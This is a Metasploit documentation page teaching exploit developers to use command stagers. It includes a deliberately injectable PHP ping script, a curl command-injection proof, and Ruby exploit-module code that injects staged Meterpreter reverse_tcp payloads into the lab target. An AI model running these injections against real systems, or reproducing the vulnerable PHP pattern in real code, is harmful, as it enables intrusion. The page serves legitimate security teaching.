class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html" class="nav-list-link">2017 Student Proposal</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html" class="nav-list-link">2018 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html" class="nav-list-link">2019 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html" class="nav-list-link">2020 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html" class="nav-list-link">2021 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html" class="nav-list-link">2022 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html" class="nav-list-link">2023 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html" class="nav-list-link">How to Apply to GSoC</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/" class="nav-list-link">Maintainers</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-keys.html" class="nav-list-link">Committer Keys</a><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-rights.html" class="nav-list-link">Committer Rights</a><li class="nav-list-item active"><a href="/docs/development/maintainers/downloads-by-version.html" class="nav-list-link">Downloads by Version</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-hackathons.html" class="nav-list-link">Metasploit Hackathons</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-loginpalooza.html" class="nav-list-link">Metasploit Loginpalooza</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/process/" class="nav-list-link">Process</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/process/assigning-labels.html" class="nav-list-link">Assigning Labels</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html" class="nav-list-link">Guidelines for Accepting Modules and Enhancements</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html" class="nav-list-link">How to deprecate a Metasploit module</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/landing-pull-requests.html" class="nav-list-link">Landing Pull Requests</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/adding-release-notes-to-prs.html" class="nav-list-link">Release Notes</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/rolling-back-merges.html" class="nav-list-link">Rolling back merges</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/unstable-modules.html" class="nav-list-link">Unstable Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/ruby-gems/" class="nav-list-link">Ruby Gems</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html" class="nav-list-link">Adding and Updating</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html" class="nav-list-link">Merging Metasploit Payload Gem Updates</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/using-local-gems.html" class="nav-list-link">Using local Gems</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/propsals/" class="nav-list-link">Proposals</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/propsals/bundled-modules-proposal.html" class="nav-list-link">Bundled Modules Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/java-meterpreter-feature-parity-proposal.html" class="nav-list-link">Java Meterpreter Feature Parity Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/msf6-feature-proposals.html" class="nav-list-link">MSF6 Feature Proposals</a><li class="nav-list-item active"><a href="/docs/development/propsals/metasploit-url-support-proposal.html" class="nav-list-link">Metasploit URL support proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/payload-rename-justification.html" class="nav-list-link">Payload Rename Justification</a><li class="nav-list-item active"><a href="/docs/development/propsals/uberhandler.html" class="nav-list-link">Uberhandler</a><li class="nav-list-item active"><a href="/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html" class="nav-list-link">Work needed to allow msfdb to use postgresql common</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/quality/" class="nav-list-link">Quality</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/quality/common-metasploit-module-coding-mistakes.html" class="nav-list-link">Common Metasploit Module Coding Mistakes</a><li class="nav-list-item active"><a href="/docs/development/quality/loading-test-modules.html" class="nav-list-link">Loading Test Modules</a><li class="nav-list-item active"><a href="/docs/development/quality/measuring-metasploit-performance.html" class="nav-list-link">Measuring Metasploit Performance</a><li class="nav-list-item active"><a href="/docs/development/quality/msftidy.html" class="nav-list-link">Msftidy</a><li class="nav-list-item active"><a href="/docs/development/quality/payload-testing.html" class="nav-list-link">Payload Testing</a><li class="nav-list-item active"><a href="/docs/development/quality/style-tips.html" class="nav-list-link">Style Tips</a><li class="nav-list-item active"><a href="/docs/development/quality/using-rubocop.html" class="nav-list-link">Using Rubocop</a><li class="nav-list-item active"><a href="/docs/development/quality/writing-module-documentation.html" class="nav-list-link">Writing Module Documentation</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/roadmap/" class="nav-list-link">Roadmap</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap.html" class="nav-list-link">2017 Roadmap</a><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap-review.html" class="nav-list-link">2017 Roadmap Review</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-breaking-changes.html" class="nav-list-link">Metasploit Breaking Changes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html" class="nav-list-link">Metasploit Data Service</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-5-release-notes.html" class="nav-list-link">Metasploit Framework 5.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-6-release-notes.html" class="nav-list-link">Metasploit Framework 6.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-framework-wish-list.html" class="nav-list-link">Metasploit Framework Wish List</a></ul></ul><li class="nav-list-item active"><a href="/docs/contact.html" class="nav-list-link">Contact</a></ul></nav><footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Metasploit Documentation" aria-label="Search Metasploit Documentation" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div><link rel="stylesheet" href="/assets/css/main.css"><nav aria-label="Auxiliary" class="aux-nav"><ul class="aux-nav-list"><li class="aux-nav-list-item"> <a href="//github.com/rapid7/metasploit-framework" class="site-button" target="_blank" rel="noopener noreferrer" > Metasploit Framework on GitHub </a></ul></nav></div><div id="main-content-wrap" class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/docs/development/">Development</a><li class="breadcrumb-nav-list-item"> <a href="/docs/development/developing-modules/">Developing Modules</a><li class="breadcrumb-nav-list-item"> <a href="/docs/development/developing-modules/guides/">Guides</a><li class="breadcrumb-nav-list-item"> <span>How to use command stagers</span></ol></nav><div id="main-content" class="main-content" role="main"><p>If you’ve found a way to execute a command on a target, and you’d like the leverage that ability to execute a command into a meterpreter session, command stagers are for you. Command stagers provide an easy way to write exploits that leverage vulnerabilities such as <a href="https://www.owasp.org/index.php/Command_Injection">command execution</a> or <a href="https://www.owasp.org/index.php/Code_Injection">code injection</a> and turn them into sessions. There are currently 14 different flavors of command stagers, each uses system command (or commands) to save (or not save) your payload, sometimes decode, and execute.</p><p>The hardest part about command stagers is understanding how much they do and what they do. All you need to do for a command stager is to define how the command injection works in the <code class="language-plaintext highlighter-rouge">execute_command</code> method and then select a few options.</p><h1 id="the-vulnerability-test-case"> <a href="#the-vulnerability-test-case" class="anchor-heading" aria-labelledby="the-vulnerability-test-case"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> The Vulnerability Test Case</h1><p>The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
   <span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 1 "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">]);</span>
      <span class="k">die</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
   <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action = </span><span class="s">"ping.php"</span> <span class="na">method = </span><span class="s">"GET"</span><span class="nt">&gt;</span>
   IP to ping: <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"text"</span> <span class="na">name = </span><span class="s">"ip"</span> <span class="nt">/&gt;</span> <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
   <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div><p>Place the above PHP script (ping.php) on an <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04">Ubuntu + Apache + PHP</a> server. Make sure your Apache server isn’t exposed to the Internet!</p><p>Under normal usage, this is how the script behaves - it just pings the host you specify, and shows you the output:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
</code></pre></div></div><p>OK, now we can abuse that a little and execute another command (id):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre></div></div><p>See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.</p><h1 id="the-msfexploitcmdstager-mixin"> <a href="#the-msfexploitcmdstager-mixin" class="anchor-heading" aria-labelledby="the-msfexploitcmdstager-mixin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> The Msf::Exploit::CmdStager Mixin</h1><p>Now let’s talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:</p><p><strong>1. Include the Msf::Exploit::CmdStager mixin</strong></p><p>Although there are many flavors of mixins/stagers, you only need to include <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmd_stager.rb">Msf::Exploit::CmdStager</a> when writing a Metasploit exploit. The mixin is basically an interface to all command stagers:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>
</code></pre></div></div><p><strong>2. Declare your flavors</strong></p><p>To tell <code class="language-plaintext highlighter-rouge">Msf::Exploit::CmdStager</code> what flavors you want, you can add the <code class="language-plaintext highlighter-rouge">CmdStagerFlavor</code> info in the module’s metadata. Either from the common level, or the target level. Multiple flavors are allowed. Remember that different flavors have different approaches to staging the payload for execution. Some flavors will break the payload apart and embed the payload data into multiple <code class="language-plaintext highlighter-rouge">echo</code> or <code class="language-plaintext highlighter-rouge">printf</code> commands to write it to disk; others like <code class="language-plaintext highlighter-rouge">wget</code> and <code class="language-plaintext highlighter-rouge">curl</code> execute a command to retrieve the payload via network connection. Your chosen flavor will be determined by the availability of a given command on the target system, the size of the command, the size of the payload, the ability to call out on the network, and the security posture of the target.</p><p>An example of setting flavors for a specific target:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Targets'</span>   <span class="o">=&gt;</span>
  <span class="p">[</span>
    <span class="p">[</span> <span class="s1">'Windows'</span><span class="p">,</span>
      <span class="p">{</span>
        <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="no">ARCH_X86_64</span><span class="p">,</span> <span class="no">ARCH_X86</span> <span class="p">],</span>
        <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
        <span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'certutil'</span><span class="p">,</span> <span class="s1">'vbs'</span> <span class="p">]</span>
      <span class="p">}</span>
    <span class="p">]</span>
  <span class="p">]</span>
</code></pre></div></div><p>Or, you can pass this info to the <code class="language-plaintext highlighter-rouge">execute_cmdstager</code> method (see Step 4 to begin).</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :vbs</span><span class="p">)</span>
</code></pre></div></div><p>However, it is best to set the compatible list of flavors in <code class="language-plaintext highlighter-rouge">CmdStagerFlavor</code>, rather than hard-coding the flavor in the <code class="language-plaintext highlighter-rouge">execute_cmdstager</code> method call, as this allows the operator to choose a flavor from <code class="language-plaintext highlighter-rouge">msfconsole</code> with <code class="language-plaintext highlighter-rouge">set CmdStager::flavor</code></p><p><strong>3. Create the execute_command method</strong></p><p>You also must create a <code class="language-plaintext highlighter-rouge">def execute_command(cmd, opts = {})</code> method in your module. This is how you define how to execute a command on the target. The parameter <code class="language-plaintext highlighter-rouge">cmd</code> is the command to execute. When writing the <code class="language-plaintext highlighter-rouge">execute_cmd</code> method, remember that a great deal of work might already be done for you. Here is an example of a web host that executes a command as part of a request:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span>
    <span class="n">populate_values</span> <span class="k">if</span> <span class="vi">@sid</span><span class="p">.</span><span class="nf">nil?</span> <span class="o">||</span> <span class="vi">@token</span><span class="p">.</span><span class="nf">nil?</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'URIPATH'</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'/vendor/htmlawed/htmlawed/htmLawedTest.php'</span>

    <span class="n">send_request_cgi</span><span class="p">({</span>
      <span class="s1">'method'</span> <span class="o">=&gt;</span> <span class="s1">'POST'</span><span class="p">,</span>
      <span class="s1">'uri'</span> <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">uri</span><span class="p">),</span>
      <span class="s1">'cookie'</span> <span class="o">=&gt;</span> <span class="s1">'sid='</span> <span class="o">+</span> <span class="vi">@sid</span><span class="p">,</span>
      <span class="s1">'ctype'</span> <span class="o">=&gt;</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">,</span>
      <span class="s1">'encode_params'</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
      <span class="s1">'vars_post'</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="vi">@token</span><span class="p">,</span>
        <span class="s1">'text'</span> <span class="o">=&gt;</span> <span class="n">cmd</span><span class="p">,</span>
        <span class="s1">'hhook'</span> <span class="o">=&gt;</span> <span class="s1">'exec'</span><span class="p">,</span>
        <span class="s1">'sid'</span> <span class="o">=&gt;</span> <span class="vi">@sid</span>
      <span class="p">}</span>
    <span class="p">})</span>
  <span class="k">end</span>
</code></pre></div></div><p>Since the command is encapsulated within a request, it will be encoded for us. When building and debugging an execute_command method that uses web requests, remember that <code class="language-plaintext highlighter-rouge">set httptrace true</code> will automatically display the http traffic as it is sent and received.</p><p><strong>4. Decide on the supported payloads</strong></p><p>CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are <code class="language-plaintext highlighter-rouge">ARCH_CMD</code> payloads that rely on software already present on the target system like <code class="language-plaintext highlighter-rouge">netcat</code>, <code class="language-plaintext highlighter-rouge">bash</code>, <code class="language-plaintext highlighter-rouge">python</code>, or <code class="language-plaintext highlighter-rouge">ssh</code>. Depending on whether the payload needs to be saved to disk or not changes what payloads are supported and how we launch the payload, so we must provide the user the ability to pick between the two. The best way to let the user decide what kind of payload to use is by defining separate <a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html">targets</a></p><p>Here is an example targets section from a command injection module:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="s1">'Targets'</span> <span class="o">=&gt;</span> <span class="p">[</span>
      <span class="p">[</span>
        <span class="s1">'Unix Command'</span><span class="p">,</span>
        <span class="p">{</span>
          <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'unix'</span><span class="p">,</span>
          <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="no">ARCH_CMD</span><span class="p">,</span>
          <span class="s1">'Type'</span> <span class="o">=&gt;</span> <span class="ss">:unix_cmd</span><span class="p">,</span>
          <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="s1">'PAYLOAD'</span> <span class="o">=&gt;</span> <span class="s1">'cmd/unix/python/meterpreter/reverse_tcp'</span><span class="p">,</span>
            <span class="s1">'RPORT'</span> <span class="o">=&gt;</span> <span class="mi">9000</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">],</span>
      <span class="p">[</span>
        <span class="s1">'Linux (Dropper)'</span><span class="p">,</span>
        <span class="p">{</span>
          <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'linux'</span><span class="p">,</span>
          <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="no">ARCH_X64</span><span class="p">],</span>
          <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">'PAYLOAD'</span> <span class="o">=&gt;</span> <span class="s1">'linux/x64/meterpreter/reverse_tcp'</span> <span class="p">},</span>
          <span class="s1">'Type'</span> <span class="o">=&gt;</span> <span class="ss">:linux_dropper</span>
        <span class="p">}</span>
      <span class="p">],</span>

</code></pre></div></div><p>The first target is the <code class="language-plaintext highlighter-rouge">ARCH_CMD</code> target and <code class="language-plaintext highlighter-rouge">unix</code> platform. This allows the user to select any payload that starts with <code class="language-plaintext highlighter-rouge">cmd/unix</code>. These payloads do not need to be saved to disk because they are “just” a command, rather than an executable file. As such, they can be contained and launched within a command line string. The second is <code class="language-plaintext highlighter-rouge">ARCH_X64</code> and the platform is <code class="language-plaintext highlighter-rouge">linux</code>; this lets us choose any payload that starts with <code class="language-plaintext highlighter-rouge">linux/x64</code> and includes binary elf payloads. These payload types must be saved to disk before they can be launched, and as such, you will often see this second type of payload referred to as a ‘dropper’ because the file must be ‘dropped’ to the disk before it can be executed. In each of the targets above, we’ve selected a default payload we know will work.</p><p><strong>4. Executing a payload</strong> As we said earlier, the way a payload is executed depends on the payload type. By including <code class="language-plaintext highlighter-rouge">Msf::Exploit::CmdStager</code> you are given access to a method called <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>. <code class="language-plaintext highlighter-rouge">execute_cmdstager</code> makes a list of required commands to encode, upload, save, decode, and execute your payload, then uses the <code class="language-plaintext highlighter-rouge">execute_command</code> method you defined earlier to run each command on the target. Unfortunately, we just mentioned not all payloads need to be saved to disk. In the case of a payload that does not need to be saved to disk, we only need to call <code class="language-plaintext highlighter-rouge">execute_command</code>. This problem of payload/method juggling sounds far worse than it is. Below is a quick example of how simple the <code class="language-plaintext highlighter-rouge">exploit</code> method will become if you have properly defined your targets as discussed in step 3:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Executing </span><span class="si">#{</span><span class="n">target</span><span class="p">.</span><span class="nf">name</span><span class="si">}</span><span class="s2"> for </span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'PAYLOAD'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
    <span class="k">case</span> <span class="n">target</span><span class="p">[</span><span class="s1">'Type'</span><span class="p">]</span>
    <span class="k">when</span> <span class="ss">:unix_cmd</span>
      <span class="n">execute_command</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span><span class="p">)</span>
    <span class="k">when</span> <span class="ss">:linux_dropper</span>
      <span class="n">execute_cmdstager</span>
    <span class="k">end</span>
  <span class="k">end</span>
</code></pre></div></div><p>That’s it. If the user selects an <code class="language-plaintext highlighter-rouge">ARCH_CMD</code> payload, we call the <code class="language-plaintext highlighter-rouge">execute_command</code> method on the payload because as we said earlier, these payloads will execute within a single command. If the user has selected a <code class="language-plaintext highlighter-rouge">dropped</code> payload like <code class="language-plaintext highlighter-rouge">ARCH_X64</code> or <code class="language-plaintext highlighter-rouge">ARCH_X86</code>, then we call <code class="language-plaintext highlighter-rouge">execute_cmdstager</code> which figures out the series of commands necessary to save the file to disk and launch it based on the flavor and max size you set earlier.</p><p>Over the years, we have also learned that these options are quite handy when calling <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><ul><li><strong>flavor</strong> - You can specify what command stager (flavor) to use from here.<li><strong>delay</strong> - How much time to delay between each command execution. 0.25 is default.<li><strong>linemax</strong> - Maximum number of characters per command. 2047 is default.</ul><p><strong>Msf::Exploit::CmdStager Template</strong></p><p>At the minimum, this is how your exploit should start when you’re using the CmdStager mixin:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
  <span class="no">Rank</span> <span class="o">=</span> <span class="no">NormalRanking</span>

  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
    <span class="k">super</span><span class="p">(</span>
      <span class="n">update_info</span><span class="p">(</span>
        <span class="n">info</span><span class="p">,</span>
        <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Command Injection Using CmdStager'</span><span class="p">,</span>
        <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{
          This exploits a command injection using the command stager.
        }</span><span class="p">,</span>
        <span class="s1">'License'</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
        <span class="s1">'Author'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'sinn3r'</span> <span class="p">],</span>
        <span class="s1">'References'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="p">[</span> <span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'http://metasploit.com'</span> <span class="p">]</span> <span class="p">],</span>
        <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'linux'</span><span class="p">,</span>
        <span class="s1">'Targets'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="p">[</span> <span class="s1">'Linux'</span><span class="p">,</span> <span class="p">{}</span> <span class="p">]</span> <span class="p">],</span>
        <span class="s1">'Payload'</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">'BadChars'</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="p">},</span>
        <span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'printf'</span> <span class="p">],</span>
        <span class="s1">'Privileged'</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
        <span class="s1">'DisclosureDate'</span> <span class="o">=&gt;</span> <span class="s1">'2016-06-10'</span><span class="p">,</span>
        <span class="s1">'DefaultTarget'</span> <span class="o">=&gt;</span> <span class="mi">0</span>
      <span class="p">)</span>
    <span class="p">)</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">opts</span> <span class="o">=</span> <span class="p">{})</span>
    <span class="c1"># calls some method to inject cmd to the vulnerable code.</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="n">print_status</span><span class="p">(</span><span class="s1">'Exploiting...'</span><span class="p">)</span>
    <span class="n">execute_cmdstager</span>
  <span class="k">end</span>

<span class="k">end</span>
</code></pre></div></div><p>As you can see, we have chosen the “printf” flavor as our command stager. We will explain more about this later, but basically what it does is it writes our payload to <code class="language-plaintext highlighter-rouge">/tmp</code> and executes it.</p><p>Now let’s modify the <code class="language-plaintext highlighter-rouge">execute_command</code> method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1+%26%26+[Malicious commands]
</code></pre></div></div><p>We do that in <code class="language-plaintext highlighter-rouge">execute_command</code> using <a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html">HttpClient</a>. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/chmod \+x/</span><span class="p">,</span> <span class="s1">'chmod 777'</span><span class="p">)</span>
  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/;/</span><span class="p">,</span> <span class="s1">' %26%26 '</span><span class="p">)</span>
  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">'+'</span><span class="p">)</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span>
  <span class="n">send_request_cgi</span><span class="p">(</span>
    <span class="p">{</span>
      <span class="s1">'method'</span> <span class="o">=&gt;</span> <span class="s1">'GET'</span><span class="p">,</span>
      <span class="s1">'uri'</span> <span class="o">=&gt;</span> <span class="s1">'/ping.php'</span><span class="p">,</span>
      <span class="s1">'encode_params'</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
      <span class="s1">'vars_get'</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="s1">'ip'</span> <span class="o">=&gt;</span> <span class="s2">"127.0.0.1+%26%26+</span><span class="si">#{</span><span class="n">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">)</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">exploit</span>
  <span class="n">print_status</span><span class="p">(</span><span class="s1">'Exploiting...'</span><span class="p">)</span>
  <span class="n">execute_cmdstager</span>
<span class="k">end</span>
